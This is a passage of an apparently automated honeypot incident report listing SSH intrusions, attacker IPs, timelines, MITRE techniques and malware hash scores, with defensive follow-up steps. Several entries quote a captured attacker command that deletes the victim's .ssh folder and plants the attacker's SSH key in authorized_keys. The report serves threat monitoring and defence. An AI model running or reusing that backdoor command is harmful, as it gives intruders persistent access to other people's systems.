- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd9d736a996b

| Field | Detail |
|---|---|
| **Source IP** | `87.106.173[.]213` |
| **First Seen** | 2026-05-14 08:11 |
| **Last Seen** | 2026-05-14 08:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 08:11:24` | `cowrie.session.connect` |
| `2026-05-14 08:11:24` | `cowrie.client.version` |
| `2026-05-14 08:11:24` | `cowrie.client.kex` |
| `2026-05-14 08:11:25` | `cowrie.login.success` |
| `2026-05-14 08:11:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.173[.]213` to AbuseIPDB if not already reported
- [ ] Block `87.106.173[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55be42818ef0

| Field | Detail |
|---|---|
| **Source IP** | `197.243.0[.]62` |
| **First Seen** | 2026-05-14 08:15 |
| **Last Seen** | 2026-05-14 08:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 08:15:05` | `cowrie.session.connect` |
| `2026-05-14 08:15:05` | `cowrie.client.version` |
| `2026-05-14 08:15:05` | `cowrie.client.kex` |
| `2026-05-14 08:15:06` | `cowrie.login.success` |
| `2026-05-14 08:15:07` | `cowrie.session.params` |
| `2026-05-14 08:15:07` | `cowrie.command.input` |
| `2026-05-14 08:15:07` | `cowrie.command.failed` |
| `2026-05-14 08:15:07` | `cowrie.log.closed` |
| `2026-05-14 08:15:07` | `cowrie.session.params` |
| `2026-05-14 08:15:07` | `cowrie.command.input` |
| `2026-05-14 08:15:08` | `cowrie.session.file_download` |
| `2026-05-14 08:15:08` | `cowrie.log.closed` |
| `2026-05-14 08:15:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.243.0[.]62` to AbuseIPDB if not already reported
- [ ] Block `197.243.0[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26b026ba4034

| Field | Detail |
|---|---|
| **Source IP** | `197.243.0[.]62` |
| **First Seen** | 2026-05-14 08:15 |
| **Last Seen** | 2026-05-14 08:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 08:15:11` | `cowrie.session.connect` |
| `2026-05-14 08:15:11` | `cowrie.client.version` |
| `2026-05-14 08:15:11` | `cowrie.client.kex` |
| `2026-05-14 08:15:12` | `cowrie.login.success` |
| `2026-05-14 08:15:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.243.0[.]62` to AbuseIPDB if not already reported
- [ ] Block `197.243.0[.]62` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92d768e474e0

| Field | Detail |
|---|---|
| **Source IP** | `109.91.4[.]177` |
| **First Seen** | 2026-05-14 08:26 |
| **Last Seen** | 2026-05-14 08:26 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 08:26:45` | `cowrie.session.connect` |
| `2026-05-14 08:26:45` | `cowrie.client.version` |
| `2026-05-14 08:26:45` | `cowrie.client.kex` |
| `2026-05-14 08:26:45` | `cowrie.login.success` |
| `2026-05-14 08:26:46` | `cowrie.session.params` |
| `2026-05-14 08:26:46` | `cowrie.command.input` |
| `2026-05-14 08:26:46` | `cowrie.command.failed` |
| `2026-05-14 08:26:46` | `cowrie.log.closed` |
| `2026-05-14 08:26:46` | `cowrie.session.params` |
| `2026-05-14 08:26:46` | `cowrie.command.input` |
| `2026-05-14 08:26:46` | `cowrie.session.file_download` |
| `2026-05-14 08:26:46` | `cowrie.log.closed` |
| `2026-05-14 08:26:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.91.4[.]177` to AbuseIPDB if not already reported
- [ ] Block `109.91.4[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1ca49d60ced

| Field | Detail |
|---|---|
| **Source IP** | `109.91.4[.]177` |
| **First Seen** | 2026-05-14 08:26 |
| **Last Seen** | 2026-05-14 08:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 08:26:49` | `cowrie.session.connect` |
| `2026-05-14 08:26:49` | `cowrie.client.version` |
| `2026-05-14 08:26:49` | `cowrie.client.kex` |
| `2026-05-14 08:26:50` | `cowrie.login.success` |
| `2026-05-14 08:26:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.91.4[.]177` to AbuseIPDB if not already reported
- [ ] Block `109.91.4[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29769f8a4a1f

| Field | Detail |
|---|---|
| **Source IP** | `94.29.124[.]154` |
| **First Seen** | 2026-05-14 09:28 |
| **Last Seen** | 2026-05-14 09:29 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 09:28:58` | `cowrie.session.connect` |
| `2026-05-14 09:28:58` | `cowrie.client.version` |
| `2026-05-14 09:28:58` | `cowrie.client.kex` |
| `2026-05-14 09:28:59` | `cowrie.login.success` |
| `2026-05-14 09:28:59` | `cowrie.session.params` |
| `2026-05-14 09:28:59` | `cowrie.command.input` |
| `2026-05-14 09:28:59` | `cowrie.command.failed` |
| `2026-05-14 09:29:00` | `cowrie.log.closed` |
| `2026-05-14 09:29:00` | `cowrie.session.params` |
| `2026-05-14 09:29:00` | `cowrie.command.input` |
| `2026-05-14 09:29:00` | `cowrie.session.file_download` |
| `2026-05-14 09:29:00` | `cowrie.log.closed` |
| `2026-05-14 09:29:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.29.124[.]154` to AbuseIPDB if not already reported
- [ ] Block `94.29.124[.]154` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-665ff6ca9132

| Field | Detail |
|---|---|
| **Source IP** | `94.29.124[.]154` |
| **First Seen** | 2026-05-14 09:29 |
| **Last Seen** | 2026-05-14 09:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 09:29:04` | `cowrie.session.connect` |
| `2026-05-14 09:29:04` | `cowrie.client.version` |
| `2026-05-14 09:29:04` | `cowrie.client.kex` |
| `2026-05-14 09:29:05` | `cowrie.login.success` |
| `2026-05-14 09:29:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.29.124[.]154` to AbuseIPDB if not already reported
- [ ] Block `94.29.124[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4843069a2f0d

| Field | Detail |
|---|---|
| **Source IP** | `172.174.72[.]225` |
| **First Seen** | 2026-05-14 09:30 |
| **Last Seen** | 2026-05-14 09:30 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 09:30:29` | `cowrie.session.connect` |
| `2026-05-14 09:30:29` | `cowrie.client.version` |
| `2026-05-14 09:30:29` | `cowrie.client.kex` |
| `2026-05-14 09:30:30` | `cowrie.login.success` |
| `2026-05-14 09:30:30` | `cowrie.session.params` |
| `2026-05-14 09:30:30` | `cowrie.command.input` |
| `2026-05-14 09:30:30` | `cowrie.command.failed` |
| `2026-05-14 09:30:31` | `cowrie.log.closed` |
| `2026-05-14 09:30:31` | `cowrie.session.params` |
| `2026-05-14 09:30:31` | `cowrie.command.input` |
| `2026-05-14 09:30:31` | `cowrie.session.file_download` |
| `2026-05-14 09:30:31` | `cowrie.log.closed` |
| `2026-05-14 09:30:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.72[.]225` to AbuseIPDB if not already reported
- [ ] Block `172.174.72[.]225` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aeab8338427a

| Field | Detail |
|---|---|
| **Source IP** | `172.174.72[.]225` |
| **First Seen** | 2026-05-14 09:30 |
| **Last Seen** | 2026-05-14 09:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 09:30:34` | `cowrie.session.connect` |
| `2026-05-14 09:30:34` | `cowrie.client.version` |
| `2026-05-14 09:30:34` | `cowrie.client.kex` |
| `2026-05-14 09:30:35` | `cowrie.login.success` |
| `2026-05-14 09:30:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.72[.]225` to AbuseIPDB if not already reported
- [ ] Block `172.174.72[.]225` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-315e832c92b4

| Field | Detail |
|---|---|
| **Source IP** | `152.32.130[.]144` |
| **First Seen** | 2026-05-14 09:36 |
| **Last Seen** | 2026-05-14 09:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 09:36:51` | `cowrie.session.connect` |
| `2026-05-14 09:36:51` | `cowrie.client.version` |
| `2026-05-14 09:36:51` | `cowrie.client.kex` |
| `2026-05-14 09:36:51` | `cowrie.login.success` |
| `2026-05-14 09:36:52` | `cowrie.session.params` |
| `2026-05-14 09:36:52` | `cowrie.command.input` |
| `2026-05-14 09:36:52` | `cowrie.command.failed` |
| `2026-05-14 09:36:52` | `cowrie.log.closed` |
| `2026-05-14 09:36:52` | `cowrie.session.params` |
| `2026-05-14 09:36:52` | `cowrie.command.input` |
| `2026-05-14 09:36:53` | `cowrie.session.file_download` |
| `2026-05-14 09:36:53` | `cowrie.log.closed` |
| `2026-05-14 09:36:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.130[.]144` to AbuseIPDB if not already reported
- [ ] Block `152.32.130[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-517df4e32f46

| Field | Detail |
|---|---|
| **Source IP** | `152.32.130[.]144` |
| **First Seen** | 2026-05-14 09:36 |
| **Last Seen** | 2026-05-14 09:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 09:36:54` | `cowrie.session.connect` |
| `2026-05-14 09:36:54` | `cowrie.client.version` |
| `2026-05-14 09:36:54` | `cowrie.client.kex` |
| `2026-05-14 09:36:55` | `cowrie.login.success` |
| `2026-05-14 09:36:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.130[.]144` to AbuseIPDB if not already reported
- [ ] Block `152.32.130[.]144` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `47.108.129[.]145` | **35** | 2026-05-14 07:04 | 2026-05-14 10:09 | 21m | 0 | `T1592` | 🟠 MEDIUM |
| `14.103.18[.]123` | **23** | 2026-05-14 07:03 | 2026-05-14 07:32 | 40m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `152.32.149[.]118` | **8** | 2026-05-14 07:55 | 2026-05-14 07:57 | 2m | 4 | `T1110.001` | 🟢 LOW |
| `166.62.92[.]145` | **2** | 2026-05-14 06:55 | 2026-05-14 07:13 | 1m | 0 | `T1592` | 🟢 LOW |
| `103.176.25[.]78` | 1 | 2026-05-14 09:48 | 2026-05-14 09:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `103.210.21[.]178` | 1 | 2026-05-14 07:12 | 2026-05-14 07:12 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `109.91.4[.]177` | 1 | 2026-05-14 08:26 | 2026-05-14 08:26 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `115.190.24[.]246` | 1 | 2026-05-14 07:00 | 2026-05-14 07:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `119.148.49[.]82` | 1 | 2026-05-14 07:15 | 2026-05-14 07:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `125.114.71[.]51` | 1 | 2026-05-14 07:03 | 2026-05-14 07:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `139.59.30[.]74` | 1 | 2026-05-14 09:12 | 2026-05-14 09:12 | 33s | 0 | `T1592` | 🟢 LOW |
| `14.103.73[.]80` | 1 | 2026-05-14 07:13 | 2026-05-14 07:13 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.76[.]234` | 1 | 2026-05-14 08:45 | 2026-05-14 08:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `152.32.130[.]144` | 1 | 2026-05-14 09:36 | 2026-05-14 09:36 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `172.174.72[.]225` | 1 | 2026-05-14 09:30 | 2026-05-14 09:30 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `197.243.0[.]62` | 1 | 2026-05-14 08:15 | 2026-05-14 08:15 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `203.0.104[.]170` | 1 | 2026-05-14 09:34 | 2026-05-14 09:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `203.236.95[.]236` | 1 | 2026-05-14 07:49 | 2026-05-14 07:49 | 13s | 0 | `T1592` | 🟢 LOW |
| `212.73.148[.]19` | 1 | 2026-05-14 07:36 | 2026-05-14 07:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.120[.]187` | 1 | 2026-05-14 07:32 | 2026-05-14 07:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `46.60.15[.]90` | 1 | 2026-05-14 09:37 | 2026-05-14 09:37 | 12s | 0 | `T1592` | 🟢 LOW |
| `51.210.243[.]91` | 1 | 2026-05-14 07:01 | 2026-05-14 07:02 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `87.106.173[.]213` | 1 | 2026-05-14 08:11 | 2026-05-14 08:11 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `94.29.124[.]154` | 1 | 2026-05-14 09:29 | 2026-05-14 09:29 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `139.59.30[.]74` | IN | DigitalOcean, LLC | **100** ⚠️ | 1 |
| `103.176.25[.]78` | VN | VAN TRANG PHARMACEUTICAL SUPPLY JOINT STOCK COMPANY | **100** ⚠️ | 6 |
| `125.114.71[.]51` | CN | CHINANET-ZJ Ningbo node network | **100** ⚠️ | 4 |
| `94.29.124[.]154` | RU | Moscow Local Telephone Network (OAO MGTS) | **100** ⚠️ | 15 |
| `87.106.173[.]213` | DE | IONOS SE | **100** ⚠️ | 3 |
| `14.103.76[.]234` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `46.60.15[.]90` | PS | AL Zaytona Company For Communication Ltd. | **100** ⚠️ | 4 |
| `14.103.18[.]123` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `197.243.0[.]62` | RW | Broadband Systems Corporation | **100** ⚠️ | 50 |
| `119.148.49[.]82` | BD | Agni Systems Limited, | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 58 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 20 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 15 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 11 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 11 |

---

## 🔕 False Positive Summary (24 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 5 |
| AbuseIPDB score 1 below threshold 25 | 1 |
